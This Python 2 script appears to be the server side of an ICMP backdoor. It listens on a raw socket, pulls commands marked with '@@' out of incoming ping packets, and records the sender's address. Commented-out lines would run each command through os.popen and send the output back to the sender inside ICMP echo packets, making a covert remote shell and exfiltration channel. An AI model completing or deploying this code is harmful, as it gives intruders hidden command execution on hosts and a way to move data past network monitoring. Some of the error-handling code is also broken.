import os, sys, socket, struct, select, time , threading ,re


ICMP_ECHO_REQUEST = 8


def checksum(source_string):

    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count = count + 2

    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff

    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
	# Swap bytes.
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer


def send_one_ping(my_socket, dest_addr, ID, onlydata):
    data = "@@"+onlydata
    dest_addr  =  socket.gethostbyname(dest_addr)
	# Header is type (8), code (8), checksum (16), id (16), sequence (16)
    my_checksum = 0
	# Make a dummy heder with a 0 checksum.
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, my_checksum, ID, 1)
    bytesInDouble = struct.calcsize("d")
    #data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	# Calculate the checksum on the data and the dummy header.
    my_checksum = checksum(header + data)
    header = struct.pack(
        "bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), ID, 1
    )
    packet = header + data
    my_socket.sendto(packet, (dest_addr, 1)) # Don't know about the 1


def do_one(dest_addr, timeout,payload):
    icmp = socket.getprotobyname("icmp")
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    except socket.error, (errno, msg):
        if errno == 1:
            # Operation not permitted
            msg = msg + (

            )
            raise socket.error(msg)
        raise # raise the original error

    my_ID = os.getpid() & 0xFFFF

    send_one_ping(my_socket, dest_addr, my_ID,payload)
    my_socket.close()
    return delay

#dest = "192.168.157.128"  #the destination ip
delay = 1

def execute(cmd):
    output = os.popen(cmd)
    return output

HOST = '0.0.0.0'  #This is the listening Host.
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
s.bind((HOST, 0))
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
print "Server Started......"
for i in range(1,2000):
    data = s.recvfrom(65565)
    d1 = str(data[0])
    data1 = re.search('@@(.*)', d1)
    command = data1.group(0)
    cmd = command[2:]
    if i%2 == 0:
        d = data[1]
        d1 = str(d)
        ip = d1[2:-5]
        print cmd   # Holding the command to execute
        print ip	#Hoslding the destination address to send the ping
        # output = execute(cmd)
        # for line in output.readlines():
        #     do_one(ip,delay,line)
